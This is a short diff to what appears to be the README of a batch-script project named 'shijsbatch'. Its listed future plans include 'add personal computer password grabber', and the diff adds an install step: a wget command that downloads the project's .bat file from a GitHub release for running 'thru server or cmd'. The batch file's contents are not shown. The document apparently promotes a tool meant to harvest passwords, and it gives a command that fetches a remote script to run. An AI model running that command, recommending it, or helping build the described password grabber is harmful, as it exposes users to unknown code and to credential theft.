@@ -18,3 +18,6 @@ plans for the future:
 - add personal computer password grabber
 
  ![original](https://github.com/user-attachments/assets/ed607000-4dc9-404b-8390-61ef2931e909)
+
+to install thru server or cmd use this
+wget https://github.com/shijsensei/shijsbatch/releases/latest/download/shijsbatch.bat 
